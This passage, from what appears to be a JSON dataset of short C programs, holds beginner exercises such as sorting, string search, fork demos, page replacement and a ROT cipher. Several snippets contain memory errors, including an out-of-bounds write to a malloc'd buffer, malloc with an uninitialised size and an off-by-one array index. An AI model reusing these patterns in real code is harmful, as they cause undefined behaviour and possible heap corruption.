68, 89, 24, 31, 73, 96, 16, 52, 92, 36, 53, 20, 34, 74, 72, 44, 88, 56, 23, 44, 54, 34, 52, 56, 40, 99, 32, 16, 71, 96, 36, 28, 58, 71, 46, 50, 31, 64, 38, 20, 134, 63, 23, 80, 40, 37, 36, 24, 54, 120, 56, 31, 60, 58, 38, 38, 52, 36, 68, 36, 35, 88, 32, 40, 108, 104, 19, 34, 93, 44, 64, 40, 28, 66, 32, 28, 43, 75, 26, 55, 74, 37, 59, 38, 44, 94, 36, 22, 110, 48, 27, 58, 52, 64, 40, 57, 38, 66, 48, 24, 93, 44, 22, 86, 92, 51, 44, 32, 31, 84, 42, 15, 74, 117, 32, 54, 28, 46, 48, 36, 84, 60, 33, 22, 66, 76, 32, 40, 84, 64, 38, 52, 19, 100, 44, 32, 82, 36, 34, 54, 86, 27, 36, 32, 52, 112, 28, 25, 99, 81, 24, 34, 64, 51, 59, 44, 28, 80, 56, 36, 110, 74, 25, 50, 40, 40, 40, 28, 78, 96, 52, 14, 54, 88, 20, 71, 84, 36, 59, 46, 46, 65, 28, 42, 96, 84, 22, 44, 34, 48, 70, 32, 30, 82, 66, 32, 55, 46, 38, 44, 48, 42, 32, 72, 52, 124, 24, 18, 132, 60, 32, 39, 72, 29, 36, 32, 44, 84, 52, 28, 66, 72, 24, 49, 96, 75, 36, 22, 30, 96, 60, 24, 72, 72, 28, 70, 46, 34, 82, 64, 48, 67, 20, 33, 46, 76, 24, 52, 88, 36, 84, 22, 39, 120, 40, 25, 84, 99, 31, 48, 68, 32, 36, 42, 48, 54, 28, 28, 78, 68, 30, 50, 64, 72, 70, 46, 22, 47, 44, 24, 136, 48, 22, 58, 54, 72, 42, 32, 60, 110, 52, 17, 59, 80, 24, 64, 78, 30, 43, 48, 39, 77, 38, 34, 98, 72, 22, 35, 52, 52, 62, 42, 40, 120, 28, 42, 68, 48, 32, 40, 110, 33, 49, 46, 44, 64, 30, 20, 100, 108, 31, 36, 26, 37, 62, 48, 36, 103, 72, 24, 67, 58, 16, 70, 76, 63, 30, 36, 62, 88, 52, 20, 82, 72, 31, 81, 46, 40, 58, 32, 56, 45, 32, 20, 84, 111, 20, 47, 84, 50, 43, 28, 31, 116, 40, 22, 90, 48, 37, 66, 44, 48, 40, 53, 38, 110, 36, 22, 79, 56, 40, 42, 96, 60, 62, 30, 19, 57, 38, 36, 140, 88, 20, 56, 70, 47, 62, 32, 54, 48, 53, 28, 50, 92, 28, 72, 36, 37, 46, 48, 43, 74, 32, 28, 80, 90, 20, 30, 100, 62, 52, 24, 58, 116, 40, 32, 54, 42, 28, 70, 66, 42, 50, 60, 30, 116, 42, 18, 126, 76, 26, 35, 38, 32, 64, 66, 58, 66, 48, 28, 82, 34, 20, 55, 92, 59, 29, 46, 28, 94, 52, 26, 74, 81, 28, 40, 42, 60, 68, 36, 68, 92, 41, 38, 74, 56, 14, 36, 100, 36, 73, 48, 34, 94, 40, 35, 56, 64, 42, 48, 81, 23, 48, 32, 66, 120, 32, 16, 78, 112, 24, 57, 42, 66, 40, 26, 43, 62, 58, 22, 128, 54, 18, 64, 44, 61, 44, 54, 52, 96, 44, 18, 63, 80, 28, 64, 72, 27, 55, 44, 38, 76, 28, 34, 120, 94, 30, 54, 36, 40, 50, 36, 36, 99, 69, 30, 51, 44, 44, 48, 104, 32, 46, 58, 30, 101, 24, 22, 140, 72, 19, 40, 46, 60, 46, 64, 56, 67, 28, 40, 65, 78, 30, 36, 56, 48, 61, 24, 50, 94, 72, 16, 64, 96, 28, 74, 46, 40, 60, 36, 62, 60, 36, 38, 86, 64, 14, 41, 108, 72, 81, 32, 23, 94, 36, 40, 80, 60, 22, 54, 68, 44, 26, 52, 58, 106, 33, 19, 102, 54, 34, 42, 72, 36, 46, 72, 22, 100, 48, 24, 98, 66, 28, 57, 78, 52, 52, 28, 42, 96, 32, 24, 59, 112, 38, 35, 58, 40, 68, 44, 44, 53, 36, 44, 100, 72, 27, 44, 44, 32, 70, 28, 52, 127, 40, 31, 50, 56, 28, 76, 118, 42, 30, 30, 26, 97, 38, 31, 120, 108, 32, 38, 42, 47, 48, 44, 32, 66, 76, 20, 99, 72, 20, 56, 68, 68, 33, 33, 50, 92, 32, 24, 104, 48, 38, 66, 54, 27, 68, 40, 56, 81, 36, 36, 50, 91, 22, 38, 100, 69, 68, 24, 23, 128, 52, 25, 94, 72, 26, 36, 62, 28, 52, 66, 56, 90, 24, 28, 71, 68, 34, 50, 68, 64, 62, 50, 30, 65, 48, 20, 92, 54, 17, 86, 72, 60, 46, 32, 76, 80, 69, 21, 44, 58, 26, 72, 48, 42, 60, 68, 50, 54, 32, 28, 124, 96, 21, 35, 53, 56, 58, 32, 46, 87, 28, 20, 83, 84, 26, 72, 80, 39, 41, 50, 33, 112, 60, 28, 102, 48, 44, 38, 36, 67, 36, 46, 40, 88, 44, 36, 91, 44, 20, 58, 114, 36, 37, 26, 60, 104, 30, 25, 84, 132, 26, 73, 34, 26, 56, 36, 70, 96, 46, 28, 60, 88, 22, 43, 100, 60, 65, 42, 26, 59, 56, 26, 68, 48, 30, 52, 52, 60, 62, 44, 36, 111, 40, 18, 111, 72, 40, 30, 54, 51, 56, 56, 27, 68, 42, 31, 130, 50, 22, 82, 68, 53, 28, 56, 58, 78, 44, 18, 38, 72, 40, 49, 98, 38, 78, 32, 42, 92, 22, 28, 122, 108, 18, 44, 68, 44, 60, 32, 40, 104, 40, 35, 47, 56, 42, 64, 84, 36, 42, 56, 36, 120, 28, 21, 100, 96, 25, 45, 78, 54, 48, 36, 44, 63, 52, 36, 90, 48, 22, 68, 40, 74, 48, 24, 39, 68, 78, 20, 96, 96, 32, 46, 38, 44, 56, 60, 78, 94, 36, 29, 92, 68, 28, 40, 100, 30, 50, 30, 23, 117, 36, 32, 88, 67, 29, 53, 58, 40, 48, 46, 54, 114, 42, 30, 78, 96, 20, 33, 56, 62, 66, 68, 26, 56, 36, 24, 128, 48, 26, 60, 79, 44, 50, 20, 72, 103, 48, 26, 38, 105, 24, 86, 62, 36, 53, 40, 42, 68, 52, 40, 96, 52, 21, 60, 60, 48, 78, 54, 36, 84, 40, 26, 54, 74, 40, 44, 108, 56, 28, 42, 52, 88, 24, 16, 134, 96, 47, 44, 52, 64, 58, 56, 40, 102, 46, 24, 66, 34, 22, 58, 72, 51, 48, 36, 27, 114, 44, 23, 106, 72, 26, 62, 57, 29, 82, 56, 66, 48, 24, 36, 42, 116, 30, 36, 94, 52, 60, 26, 34, 116, 60, 32, 90, 60, 27, 44, 54, 34, 40, 60, 76, 118, 32, 27, 100, 56, 26, 38, 48, 45, 64, 48, 23, 76, 60, 28, 120, 108, 22, 54, 44, 64, 34, 44, 68, 108, 63, 18, 75, 48, 32, 71, 68, 39, 66, 36, 43, 82, 24, 34, 80, 54, 25, 50, 105, 60, 44, 32, 28, 124, 48, 38, 58, 64, 22, 52, 112, 30, 53, 44, 36, 97, 28, 27, 92, 96, 46, 56, 28, 58, 68, 42, 46, 51, 48, 28, 91, 72, 20, 76, 120, 74, 31, 32, 43, 56, 52, 22, 98, 99, 18, 78, 40, 37, 84, 32, 50, 46, 57, 25, 100, 82, 24, 30, 80, 60, 58, 50, 35, 128, 32, 29, 76, 52, 40, 72, 66, 32, 36, 48, 58, 120, 36, 24, 62, 93, 32, 51, 58, 59, 48, 32, 31, 59, 60, 38, 140, 60, 22, 40, 52, 52, 48, 56, 72, 104, 32, 29, 51, 82, 24, 58, 72, 42, 77, 36, 47, 104, 32, 19, 96, 128, 16, 31, 58, 44, 68, 22, 58, 90, 52, 48, 68, 44, 26, 73, 80, 47, 46, 78, 36, 70, 40, 20, 132, 60, 34, 46, 58, 64, 36, 56, 40, 96, 32, 24, 93, 51, 24, 86, 92, 36, 40, 32, 42, 116, 78, 20, 94, 80, 34, 33, 54, 46, 56, 40, 34, 63, 28, 48, 82, 102, 20, 35, 116, 54};\nint main()\n{\n    int n, i, j, z, count = 0, res;\n    while (1) {\n        scanf(\"%d\", &n);\n        if (n == -1) {\n            break;\n        }\n        printf(\"%d\\n\", arr[n - 1]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint numbers[5] = { 3, 9, 27, 81, 243};\nint main(void) {\n    int i = 0;\n    while (i < 5) {\n        printf(\"%d\\n\", numbers[i]);\n        i++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nchar* find(char *haystack, char needle){\n    while (*haystack != needle)\n        if (!*haystack++)\n            return ((void*)0);\n    return (char *)haystack;\n}\nint main(){\n    char haystack[400];\n    char needle;\n    fgets(haystack, 400, (stdin));\n    scanf(\"%c\", &needle);\n    char* found = find(haystack, needle);\n    int index = found ? found - haystack : -1;\n    printf(\"%d\", index);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int i,n;\n int sum=0;\n scanf(\"%d\",&n);\n for(i=1;i<=n;i++)\n {\n  sum=sum+i;\n  printf(\"%d\",i);\n  if(i<n)\n   printf(\"+\");\n }\n printf(\" = %d\",sum);\n return 0;\n}",
    "\n\n\n\nvoid foo() {\n   int I;\n   float A[100];\n   float F[100];\n   A[0] = 0.0;\n   for (I=1; I <= 10; I++)\n   {\n      A[I] = F[I] * 2.0;\n      A[0] += A[I];\n   }\n   return;\n}\nint main() {\n   foo();\n   return 0;\n}",
    "#include <stdio.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\nint main(int argc, char **argv){\n    pid_t child_pid_1;\n    pid_t child_pid_2;\n    pid_t child_pid_3;\n    printf(\"numero do processo original: %d\\n\", (int) getpid());\n    child_pid_1 = fork();\n    if(child_pid_1 == 0){\n        printf(\"filho_1 %d\\n\", (int) getpid());\n    }\n    else{\n        child_pid_2 = fork();\n        if(child_pid_2 == 0){\n            printf(\"filho_2 %d\\n\", (int) getpid());\n        }\n        else{\n            child_pid_3 = fork();\n            if(child_pid_3 == 0){\n                printf(\"filho_3 %d\\n\", (int) getpid());\n            }\n            else{\n                printf(\"pai %d\\n\", (int) getpid());\n            }\n        }\n    }\n    return 0;\n}",
    "#include <stdlib.h>\nvoid f(void)\n{\n    int *x = malloc(10 * sizeof(int));\n    x[10] = 0;\n}\nint main(void)\n{\n    f();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid sort_insert(int a[],int len)\n{\n int i,j,t;\n printf(\"222222222222\\n\");\n for(i=0;i<len;i++){\n  j=i;\n  t=a[i];\n  while(t<a[j-1] && j>=0){\n   a[j]=a[j-1];\n   j--;\n  }\n  a[j]=t;\n }\n}\n\nvoid bubble_sort(int s[],int len)\n{\n int i,j,t;\n for(i=0;i<len;i++)\n  for(j=0;j<len-1;j++){\n   if(s[j]>s[j+1])\n    {s[j]^=s[j+1];s[j+1]^=s[j];s[j]^=s[j+1];};\n  }\n}\nint main(int argc, char *argv[])\n{\n int s[6]={5,4,7,6,1,9};\n int i;\n bubble_sort(s,6);\n for(i=0;i<6;i++){\n  printf(\"%d \",s[i]);\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <limits.h>\n\n\n\nstatic long openmax = 0;\n\n\nlong open_max(void) {\n    if (openmax == 0) {\n        errno = 0;\n        if ((openmax = sysconf(4)) < 0) {\n            if (errno == 0) {\n                openmax = 256;\n            } else {\n                fprintf((stderr), \"sysconf error for _SC_OPEN_MAX\\n\");\n            }\n        }\n    }\n    return openmax;\n}\nint main(int argc, char const *argv[])\n{\n    printf(\"Open max = %ld\\n\", open_max());\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n,x,y,k;\n    printf(\"Enter the number of rows to show the number pattern:- \\n\");\n    scanf(\"%d\",&n);\n    for(x=1;x<=n;x++)\n    {\n        for(y=x;y<=n;y++)\n        {\n            printf(\" \");\n        }\n        for(k=1;k<(x*2);k++)\n        {\n            printf(\"%d\",k);\n        }\n        printf(\"\\n\");\n    }\n    for(x=4;x>=1;x--)\n    {\n        for(y=n;y>x;y--)\n        {\n            printf(\"\\n\");\n        }\n        for(k=1;k<(x*2);k++)\n        {\n            printf(\"%d\",k);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n   char s[] = \"Hello World\";\n   char ch = 'a';\n   int i = 0;\n   int count = 0;\n   while(s[i] != '\\0') {\n      if(s[i] == ch)\n         count++;\n      i++;\n   }\n   if(count > 0) {\n      if(count == 1)\n         printf(\"%c appears %d time in '%s'\", ch, count, s);\n      else\n         printf(\"%c appears %d times in '%s'\", ch, count, s);\n   }else\n      printf(\"%c did not appear in %s\", ch, s);\n   return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int L, B, year = 0;\n    scanf(\"%d%d\", &L, &B);\n    while (L <= B)\n    {\n        L *= 3;\n        B *= 2;\n        year++;\n    }\n    printf(\"%d\\n\", year);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nunsigned char original_text[] = \"Team Swift\";\nunsigned char original_pattern[] = \"if\";\nunsigned char *simple_search(unsigned char *text,\n        unsigned char *pattern)\n{\n    int i;\n    while ((*text) != '\\0') {\n        for (i = 0; pattern[i] != '\\0'; i++) {\n            if (pattern[i] != text[i]) {\n                break;\n            }\n        }\n        if (pattern[i] == '\\0') {\n            return text;\n        }\n        text++;\n    }\n    return ((void*)0);\n}\nint main(void)\n{\n    unsigned char *result;\n    result = simple_search(original_text, original_pattern);\n    if (result == ((void*)0)) {\n        printf(\"\\\"%s\\\" was not found\\n\", original_pattern);\n    } else {\n        printf(\"\\\"%s\\\" was found\\n\", original_pattern);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(){\n   int *p,n;\n   p =(int *)malloc(sizeof(int)*n);\n   printf(\"Enter n:\\n\");\n   scanf(\"%d\",&n);\n   for(int i=0;i<n;i++){\n    printf(\"Enter value: \\n\");\n    scanf(\"%d\",p+i);\n   }\n   for(int i=0;i<n;i++){\n    printf(\"%d \",*(p+i));\n   }\n  n++;\n  for(int i=0;i<n;i++){\n    printf(\"Enter value: \\n\");\n    scanf(\"%d\",p+i);\n   }\n}",
    "#include <stdio.h>\n\nint main(void) {\n    float radius = 0.0f;\n    float diameter = 0.0f;\n    float circumference = 0.0f;\n    float area = 0.0f;\n    printf(\"Input the diameter of a table:\");\n    scanf(\"%f\", &diameter);\n    radius = diameter/2.0f;\n    circumference = 2.0f * 3.14159f * radius;\n    area = 3.14159f * radius * radius;\n    printf(\"\\nThe circunference is %.2f\", circumference);\n    printf(\"\\nThe area is %.2f\", area);\n    return 0;\n}",
    "int printf(const char* format,...);\nint global_init_var = 84;\nint global_uninit_var;\nvoid func1(int i){\n printf(\"%d\\n\", i);\n}\nint main(int argc, char const *argv[])\n{\n static int static_var = 85;\n static int static_var2;\n int a = 1;\n int b;\n func1(static_var + static_var2 + a + b);\n return a;\n}",
    "#include <stdio.h>\nint main () {\n int n, temp, i = 0, sum = 0;\n    scanf(\"%d\", &n);\n    temp = n;\n    while (temp) {\n        sum += temp % 10;\n        temp /= 10;\n        i++;\n    }\n    printf(\"%d %d\", i, sum);\n    return 0;\n}",
    "extern int decl_test;\nint decl_test = 0;\nint main(void)\n{\n decl_test ++;\n return decl_test;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[]) {\n    int votos[5], total_votos, candidato_ganhador;\n    for (int i = 0; i <= 5; i++) {\n        votos[i] = 0;\n    }\n    unsigned int opcao;\n    do {\n        printf(\"Vote nos seguintes candidatos:\\n\");\n        printf(\"1. Candidato Jair Rodrigues\\n\");\n        printf(\"2. Candidato Carlos Luz\\n\");\n        printf(\"3. Candidato Neves Rocha\\n\");\n        printf(\"4. Nulo\\n\");\n        printf(\"5. Branco\\n\");\n        scanf(\"%i\", &opcao);\n        getchar();\n        if (opcao <= 5)\n            votos[opcao] += 1;\n        else\n            printf(\"Opcao invalida\");\n    } while (opcao != 6);\n    printf(\"A) Total de votos:\\n\");\n    printf(\"Candidato Jair Rodrigues: %i votos\\n\", votos[1]);\n    printf(\"Candidato Carlos Luz: %i votos\\n\", votos[2]);\n    printf(\"Candidato Neves Rocha: %i votos\\n\", votos[3]);\n    for (int i = 1; i <= 5; i++)\n        total_votos += votos[i];\n    printf(\"B) Votos Nulos: %.2f votos\\n%%\",((float)votos[4]/(float)total_votos)*100);\n    printf(\"C) Votos Brancos: %.2f votos\\n%%\",((float)votos[5]/(float)total_votos)*100);\n    for (int i = 2; i <= 3; i++) {\n        if (votos[i - 1] > votos[i])\n            candidato_ganhador = i - 1;\n        else if (votos[i - 1] < votos[i])\n            candidato_ganhador = i;\n    }\n    printf(\"D) O candidato vencedor eh: O Candidato %i\\n\",candidato_ganhador);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int pages[20], frames[20], np, nf, i, j, faults = 0, q ,k, temp[20];\n int flag1, flag2, flag3, pos, max;\n printf(\"Enter the no. of frames-\\n\");\n scanf(\"%d\", &nf);\n printf(\"Enter the no. of pages-\\n\");\n scanf(\"%d\", &np);\n printf(\"Enter the pages -\\n\");\n for(i=0;i<np;i++)\n  scanf(\"%d\", &pages[i]);\n for(i=0;i<20;i++)\n  frames[i] = -1;\n for(i=0; i<np; i++)\n {\n  flag1 = 0;\n  flag2 = 0;\n  for(j=0; j<nf; j++)\n  {\n   if(frames[j] == pages[i])\n   {\n    flag1 = flag2 = 1;\n    break;\n   }\n  }\n  if(flag1 == 0)\n  {\n   for(j=0; j<nf; j++){\n   if(frames[j] == -1)\n   {\n    faults++;\n    frames[j] = pages[i];\n    flag2 = 1;\n    break;\n   }\n   }\n  }\n  if(flag2 == 0)\n  {\n   flag3 = 0;\n   for(j=0;j<nf;j++)\n   {\n    temp[j] = -1;\n    for(k = i+1; k < np; k++)\n    {\n     if(frames[j] == pages[k])\n     {\n      temp[j] = k;\n      break;\n     }\n    }\n   }\n   for(j=0; j<nf; j++){\n    if(temp[j] == -1)\n    {\n     pos = j;\n     flag3 = 1;\n     break;\n    }\n   }\n   if(flag3 == 0)\n   {\n   max = temp[0];\n   pos = 0;\n   for(q = 1; q<nf; q++)\n   {\n    if(max < temp[q])\n    {\n     max = temp[q];\n     pos = q;\n    }\n   }\n   }\n   frames[pos] = pages[i];\n   faults++;\n  }\n  for(k=0;k<nf;k++)\n  {\n   printf(\"%d \", frames[k]);\n  }\n  printf(\"\\n\");\n }\n printf(\"Faults = %d\\n\", faults);\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n,d;\n    scanf(\"%d\",&n);\n    int arr[n];\n    for(int i=0;i<n;i++)\n    scanf(\"%d\",&arr[i]);\n    scanf(\"%d\",&d);\n    for(int i=0;i<n;i++)\n    {\n        for(int j=i+1;j<n;j++)\n        {\n            if(arr[j]<arr[i])\n            {\n                int temp = arr[j];\n                arr[j] = arr[i];\n                arr[i] = temp;\n            }\n        }\n    }\n    for(int i=0;i<n;i++)\n    printf(\"%d \",arr[i]); printf(\"\\n\");\n    int left=0,right=n-1,mid,flag=0,sum=-1;\n    for(int i=0;i<n;i++)\n    {\n        left = 0; right =n-1;\n        while(left<=right)\n        {\n            mid = left + ((right-left)/2) ;\n            if(arr[mid]==(arr[i]+d))\n            {\n                sum = arr[mid] + arr[i];\n                flag=1;\n                break;\n            }\n            else if(arr[mid]>(arr[i]+d))\n            {\n                right = mid-1;\n            }\n            else\n            {\n                left = mid+1;\n            }\n        }\n        if(flag==1) break;\n    }\n    printf(\"%d \\n\",sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int n;\n printf(\"Entrer un nombre n: \");\n scanf(\"%d\", &n);\n if (n < 0)\n {\n  printf(\"Veuillez rentrer un nombre > 0\");\n  exit(1);\n }\n int s = 0;\n for (int i = 1; i < n + 1; i++)\n  s += i * i;\n printf(\"Somme des carr\u00e9s de 1 \u00e0 %d = %d\\n\", n, s);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid swap(char *x, char *y);\nchar *reverse(char *buffer, int i, int j);\nchar *itoa(int value, char *buffer, int base);\nint main(void) {\n    char buffer[33];\n    int value[] = {255, 27, 64, 128};\n    int base[] = {16, 10, 8, 2};\n    for (int i = 0; i < 4; i++) {\n        printf(\"itoa(%d, %d) = %s\\n\", value[i], base[i], itoa(value[i], buffer, base[i]));\n    }\n    return 0;\n}\nvoid swap(char *x, char *y) {\n    char t = *x;\n    *x = *y;\n    *y = t;\n}\nchar *reverse(char *buffer, int i, int j) {\n    while (i < j) {\n        swap(&buffer[i++], &buffer[j--]);\n    }\n    return buffer;\n}\nchar *itoa(int value, char *buffer, int base) {\n    if (base < 2 || base > 32) {\n        return buffer;\n    }\n    int n = abs(value);\n    int i = 0;\n    while (n) {\n        int x = n % base;\n        buffer[i++] = (char) (x >= 10 ? 65 + (x - 10) : 48 + x);\n        n = n / base;\n    }\n    if (i == 0) {\n        buffer[i++] = '0';\n    }\n    if (value < 0 && base == 10) {\n        buffer[i++] = '-';\n    }\n    buffer[i] = '\\0';\n    return reverse(buffer, 0, i - 1);\n}",
    "#include <stdio.h>\n\nint main(){\n    printf(\"After concartenating two integers 32 and 45: %d\\n\",3245);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nchar str[109][20];\nint same(int x)\n{\n int i;\n for (i = 0; i < x; ++i)\n  if (strcmp(str[i], str[x]) == 0)\n   return 1;\n return 0;\n}\nint main(void)\n{\n int n, i;\n scanf(\"%d\", &n);\n for (i = 0; i < n; ++i) {\n  scanf(\"%s\", str[i]);\n  if (same(i)) {\n   puts(\"No\");\n   return 0;\n  }\n  if (i && str[i - 1][strlen(str[i - 1]) - 1] != str[i][0]) {\n   puts(\"No\");\n   return 0;\n  }\n }\n puts(\"Yes\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\nvoid findBruteForce (int *a, int length)\n{\n    _Bool *visited = malloc (length * sizeof (_Bool));\n    for (int i = 0; i < length; i++)\n    {\n        int x = a[i];\n        if (!visited[i])\n        {\n            _Bool isDuplicate = 0;\n            for (int j = i + 1; j < length; j++)\n            {\n                if (x == a[j])\n                {\n                    isDuplicate = 1;\n                    visited[j] = 1;\n                }\n            }\n            if (!isDuplicate)\n                printf (\"Element appear only once in array - %d.\\n\", x);\n        }\n    }\n    free (visited);\n}\nint main ()\n{\n    int a[] = {1,5,6,2,1,6,4,3,2,5,3};\n    findBruteForce (a, sizeof (a) / sizeof (a[0]));\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint Etat[9];\nint Polynome[9] = {1,0,0,1,0,0,1,1,0};\nvoid Initialise(int* e){\n  for(int i = 0; i<9;i++){\n    Etat[i] = e[i];\n  }\n}\nvoid AfficheEtat(){\n  for(int i = 9 -1; i >= 0; i--){\n    printf(\"%2d\",Etat[i]);\n  }\n  printf(\"\\n\");\n}\nvoid Avance(){\n  int El = 0;\n  for(int i = 0; i < 9;i++){\n    El+=Polynome[i]*Etat[i];\n  }\n  for(int i = 0; i < 9 -1;i++){\n    Etat[i] = Etat[i+1];\n  }\n  Etat[9 -1] = El%2;\n}\nint SontEgaux(int*a,int*b){\n  for(int i = 0; i < 9;i++){\n    if(a[i] != b[i]){\n      return 0;\n    }\n  }\n  return 1;\n}\nvoid VingtIteration(){\n  for(int i = 0; i < 20 ; i++){\n    Avance();\n  }\n}\nint Periode(){\n  int periode = 0;\n  int bound = 1000;\n  int seen[bound][9];\n  while(1){\n    memcpy(seen[periode],Etat,9*sizeof(int));\n    periode++;\n    Avance();\n    for(int i = 0; i < periode;i++){\n      if(SontEgaux(seen[i],Etat)){\n        periode -= i;\n        return periode;\n      }\n    }\n    if(periode == bound){break;}\n  }\n  return periode;\n}\nint main(){\n  int EtatInitial[9] = {1,0,0,0,0,0,0,0,0};\n  printf(\"EtatInitial:\\n\");\n  Initialise(EtatInitial);\n  AfficheEtat(Etat);\n  VingtIteration();\n  printf(\"Apr\u00e8s 20 iterations:\\n\");\n  AfficheEtat();\n  Initialise(EtatInitial);\n  printf(\"Periode = %d\\n\",Periode());\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nint main()\n{\n int oldY = -1;\n int target = -1;\n int x, y, max, h;\n for (;;) {\n  scanf(\"%d%d\", &x, &y);\n  if (y != oldY) {\n   oldY = y;\n   max = 0;\n   for (int i = 0; i < 8; i++) {\n    scanf(\"%d\", &h);\n    if (h > max) {\n     target = i;\n     max = h;\n    }\n   }\n  }\n  else\n   for (int i = 0; i < 8; i++)\n    scanf(\"%d\", &h);\n  printf(x == target ? \"FIRE\\n\" : \"HOLD\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n\n\nvoid fibo(int n){\n int i, hasil;\n if(n==1) (void)printf(\"0\");\n else {\n     (void)printf(\"0 3 \");\n     int a = 0, b = 3;\n     for(i=0;i<n-2;i++) {\n      hasil = a + b;\n      a = b;\n      b = hasil;\n      (void)printf(\"%d \", hasil);\n  }\n }\n}\nint main(){\n    int x;\n    (void)scanf(\"%d\", &x);\n    fibo(x);\n return 0;\n}",
    "#include <ctype.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n\nchar rotX(char in, unsigned rot);\nunsigned readRotCount();\nchar rotX(char in, unsigned rot) {\n    if((0 ? isalpha(in) : (((unsigned)(in)|32)-'a') < 26)) {\n        if((0 ? isupper(in) : ((unsigned)(in)-'A') < 26)) {\n            return 'A' + ((in - 'A') + rot) % 26;\n        }\n        return 'a' + ((in - 'a') + rot) % 26;\n    }\n    return in;\n}\nunsigned readRotCount() {\n    int rot = -1;\n    do\n    {\n        printf(\"Enter Rot:\\n\");\n        fflush((stdout));\n        if(!scanf(\"%i\", &rot)) {\n            int c;\n            while ((c = getchar()) != '\\n' && c != (-1));\n        }\n    } while (rot < 0);\n    return (unsigned)rot;\n}\nint main() {\n    unsigned rot = readRotCount();\n    char buff[1024];\n    printf(\"Enter text:\\n\");\n    size_t n = read(0, buff, 1024 - 1);\n    for (size_t i = 0; i < n && buff[i]; i++)\n    {\n        buff[i] = rotX(buff[i], rot);\n    }\n    printf(\"%s\", buff);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid print_array(char **array, int size)\n{\n    int i;\n    printf(\"[\");\n    for (i = 0; i < size; i++) {\n        if (i != 0) {\n            printf(\", \");\n        }\n        printf(\"\\\"%s\\\"\", array[i]);\n    }\n    printf(\"]\\n\");\n}\nchar **letter_combinations(char *digits, int *return_size)\n{\n    char *letter_matrix[10] = {\"\", \" \", \"abc\", \"def\", \"ghi\", \"jkl\", \"mno\", \"pqrs\", \"tuv\", \"wxyz\"};\n    int letter_length[10] = {0};\n    int i, j, k;\n    for (i = 0; i < 10; i++) {\n        letter_length[i] = strlen(letter_matrix[i]);\n    }\n    int empty = 1;\n    int count = 1;\n    int digits_len = strlen(digits);\n    for (i = 0; i < digits_len; i++) {\n        int idx = digits[i] - '0';\n        if (letter_length[idx] > 0) {\n            empty = 0;\n            count *= letter_length[idx];\n        }\n    }\n    if (empty) {\n        *return_size = 0;\n        return ((void*)0);\n    }\n    *return_size = count;\n    char **letters = malloc(sizeof(char *) * count);\n    for (i = 0; i < count; i++) {\n        letters[i] = malloc(digits_len + 1);\n        memset(letters[i], 0, digits_len + 1);\n    }\n    int freq = 1;\n    for (i = digits_len - 1; i > 0; i--) {\n        int n = digits[i] - '0';\n        if (letter_length[n] > 0) {\n            freq *= letter_length[n];\n        }\n    }\n    int col = 0;\n    for (i = 0; i < digits_len; i++) {\n        int n = digits[i] - '0';\n        if (letter_length[n] > 0) {\n            if (i > 0) {\n                if (letter_length[n] > 0) {\n                    freq /= letter_length[n];\n                }\n            }\n            for (j = 0; j < count; j++) {\n                k = (j / freq) % letter_length[n];\n                letters[j][col] = letter_matrix[n][k];\n            }\n            col++;\n        }\n    }\n    return letters;\n}\nint main(int argc, char **argv)\n{\n    int size = 0;\n    char *digits = \"23\";\n    char **letters = letter_combinations(digits, &size);\n    printf(\" Input: %s\\n Output: \", digits);\n    print_array(letters, size);\n    free(letters);\n    return 0;\n}",
    "#include <stdio.h>\nvoid a()\n{\n    printf(\"hello pointer\") ;\n}\nvoid B(void (*ptr)())\n{\n    ptr() ;\n}\nint main()\n{\n    B(&a) ;\n}",
    "#include <stdio.h>\nint main()\n{\nint n;\nscanf(\"%d\",&n);\nint sum=0;\nwhile(n!=0)\n{\n sum=sum+n%10;\n n=n/10;\n}\nprintf(\"%d\\n\",sum);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\nint main()\n{\n char byte_written,*byte_read,dummy;\n   FILE * MEM;\n size_t result;\n  MEM=fopen(\"/dev/memory\",\"wb\");\n   setvbuf(MEM,&dummy,2,1);\n   byte_written='a';\n byte_read = (char*) malloc (sizeof(char));\n   printf(\"Byte value written is %c\\n\",byte_written);\n   fwrite(&byte_written,1,1,MEM);\n fclose (MEM);\n MEM = fopen(\"/dev/memory\", \"rb\");\n   result = fread(byte_read,1,1,MEM);\n   printf(\"Byte value read is %c\\n\",*byte_read);\n printf(\"Number of bytes read is %d\\n\",result);\n   fclose(MEM);\n}",
    "#include<stdio.h>\nint main()\n{\n int m,n,fenm,fenz,i=1,j=1;\n scanf(\"%d%d\",&m,&n);\n if(n==0)\n printf(\"%d\",m);\n if(n>0){\n  for(fenm=1;i<=n;i++){\n   fenm*=i;\n  }\n  for(fenz=m;j<n;j++){\n   m--;\n   fenz*=m;\n  }\n  printf(\"%d\",fenz/fenm);\n }\n}",
